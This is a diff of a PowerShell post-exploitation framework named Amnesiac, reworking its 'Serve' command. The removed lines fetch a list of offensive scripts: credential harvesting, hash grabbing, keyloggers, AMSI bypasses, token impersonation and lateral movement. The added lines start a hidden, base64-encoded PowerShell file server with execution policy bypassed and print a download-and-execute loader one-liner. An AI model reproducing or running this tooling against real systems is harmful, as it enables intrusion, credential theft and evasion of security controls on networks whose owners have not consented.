@@ -1027,149 +1027,51 @@ function Amnesiac {
 		}
 		
 		if ($choice -like "Serve*") {
-			
-			$commandParts = $choice -split '\s+', 3
+			$commandParts = $choice -split '\s+', 2
+			$userdefPort  = if ($commandParts[1]) { [int]$commandParts[1] } else { 8080 }
 
-			$userdefPort = $commandParts[1]
-			$userdefPath = $commandParts[2]
+			if ($Detached) { $DefineHostname = $global:IP }
+			else { $DefineHostname = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName }
 
-			if($userdefPath){$userdefPath = $userdefPath.TrimEnd('\')}
-			else{$userdefPath = "c:\Users\Public\Documents\Amnesiac\Scripts"}
-			
-			if(!$userdefPort){$userdefPort = 8080}
-			
-			if($Detached){$DefineHostname = $global:IP}
-			else{$DefineHostname = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName}
-			
-			$urls = @(
-				"$($global:ServerURL)/Ask4Creds.ps1",
-				"$($global:ServerURL)/Find-LocalAdminAccess.ps1",
-				"$($global:ServerURL)/Invoke-SessionHunter.ps1",
-				"$($global:ServerURL)/PInject.ps1",
-				"$($global:ServerURL)/Invoke-SMBRemoting.ps1",
-				"$($global:ServerURL)/Invoke-WMIRemoting.ps1",
-				"$($global:ServerURL)/Token-Impersonation.ps1",
-				"$($global:ServerURL)/Tkn_Access_Check.ps1",
-				"$($global:ServerURL)/Invoke-GrabTheHash.ps1",
-				"$($global:ServerURL)/klg.ps1",
-				"$($global:ServerURL)/cms.ps1",
-				"$($global:ServerURL)/dumper.ps1",
-				"$($global:ServerURL)/SimpleAMSI.ps1",
-				"$($global:ServerURL)/NETAMSI.ps1",
-				"$($global:ServerURL)/HiveDump.ps1",
-				"$($global:ServerURL)/TermsrvPatcher.ps1",
-				"$($global:ServerURL)/Invoke-Patamenia.ps1",
-				"$($global:ServerURL)/Suntour.ps1",
-				"$($global:ServerURL)/Ferrari.ps1",
-				"$($global:ServerURL)/pwv.ps1",
-				"$($global:ServerURL)/ppl.ps1",
-    			"$($global:ServerURL)/RDPKeylog.exe",
-				"$($global:ServerURL)/TGT_Monitor.ps1"
-			)
-			
-			# Specify the folder where files will be downloaded
-			$destinationFolder = $userdefPath
-
-			# Create the folder if it does not exist
-			if (-not (Test-Path -Path $destinationFolder)) {
-				New-Item -ItemType Directory -Force -Path $destinationFolder
-			}
-			
-			Write-Output ""
-			Write-Output " [+] Downloading Scripts to $destinationFolder"
-			
-			$runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
-			$runspacePool.Open()
-
-			$runspaces = @()
-
-			foreach ($url in $urls) {
-				# Create a separate variable that will be captured by the script block
-				$currentUrl = $url
-
-				$powershell = [powershell]::Create().AddScript({
-					param($url, $destinationFolder)
-
-					function Get-FileNameFromUrl {
-						param ([string]$url)
-						$uri = [System.Uri]$url
-						$filename = [System.IO.Path]::GetFileName($uri.LocalPath)
-						return $filename -replace '[^A-Za-z0-9.-]', '_'
-					}
-
-					function Download-File {
-						param($url, $destinationPath)
-						try {
-							Invoke-WebRequest -Uri $url -OutFile $destinationPath
-						} catch {
-							Write-Output "Error downloading '$url': $_"
-						}
-					}
-
-					$fileName = Get-FileNameFromUrl -url $url
-					$destinationPath = Join-Path -Path $destinationFolder -ChildPath $fileName
-
-					if (!(Test-Path -Path $destinationPath)) {
-						Download-File -url $url -destinationPath $destinationPath
-					}
-				}).AddArgument($currentUrl).AddArgument($destinationFolder)
-
-				$powershell.RunspacePool = $runspacePool
-
-				$runspaces += [PSCustomObject]@{
-					Pipe = $powershell
-					Status = $powershell.BeginInvoke()
-				}
+			$serveRoot = $global:AmnesiacRoot
+			$toolsPath = Join-Path $serveRoot "Tools"
+			if (-not (Test-Path $toolsPath)) {
+				$global:Message = " [!] Tools\ not found at '$toolsPath'. Cannot start server."
+				continue
 			}
 
-			foreach ($runspace in $runspaces) {
-				$runspace.Pipe.EndInvoke($runspace.Status)
-				$runspace.Pipe.Dispose()
-			}
+			Initialize-ToolCache
 
-			$runspacePool.Close()
-			$runspacePool.Dispose()
-			
-			$global:ServerURL = "http://$($DefineHostname):$userdefPort"
-			
-			$scriptWithCommand = $FileServerScript + "`nFile-Server -Port $userdefPort -Path $userdefPath"
+			$global:ServerURL = "http://$($DefineHostname):$userdefPort/Tools"
 
-			$bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptWithCommand)
-
+			$scriptWithCommand = $FileServerScript + "`nFile-Server -Port $userdefPort -Path '$serveRoot'"
+			$bytes          = [System.Text.Encoding]::Unicode.GetBytes($scriptWithCommand)
 			$encodedCommand = [Convert]::ToBase64String($bytes)
-
-			$global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ep Bypass", "-NoProfile", "-enc $encodedCommand" -PassThru
-
+			$global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden `
+				-ArgumentList "-ep Bypass", "-NoProfile", "-enc $encodedCommand" -PassThru
 			$processId = $global:FileServerProcess.Id
 
-			$global:Message += " [+] File Server started with PID $processId. To kill it [Stop-Process -Id $processId]"
-			
-			# Embedded monitoring script
+			$loaderURL       = "http://$($DefineHostname):$userdefPort/Amnesiac_ShellReady.ps1"
+			$global:Message  = " [+] File server started (PID $processId)`n"
+			$global:Message += " [+] Tools:  $($global:ServerURL)`n"
+			$global:Message += " [+] Loader: $loaderURL`n"
+			$global:Message += "     Scenario 2: iex (New-Object Net.WebClient).DownloadString('$loaderURL'); Amnesiac"
+
 			$parentProcessId = $PID
-			
 			$FileServerMonitoringScript = @"
 while (`$true) {
-	Start-Sleep -Seconds 5 # Check every 5 seconds
-
-	# Check if the primary script is still running using its Process ID
+	Start-Sleep -Seconds 5
 	`$process = Get-Process | Where-Object { `$_.Id -eq $parentProcessId }
-
-	if (-not `$process) {
-		# If the process is not running, kill the File Server
-		Stop-Process -Id $processId
-		break # Exit the monitoring script
-	}
+	if (-not `$process) { Stop-Process -Id $processId; break }
 }
 exit
 "@
-			$b64FileServerMonitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FileServerMonitoringScript))
-	
-			# Execute the embedded monitoring script in a hidden window
-			Start-Process powershell.exe -ArgumentList "-WindowS Hidden -ep Bypass -enc $b64FileServerMonitoringScript" -WindowStyle Hidden
-			
+			$b64Mon = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FileServerMonitoringScript))
+			Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ep Bypass -enc $b64Mon" -WindowStyle Hidden
+
 			continue
 		}
-		
+
 		if ($choice -like "RepoURL*") {
 			
 			$commandParts = $choice -split '\s+', 2
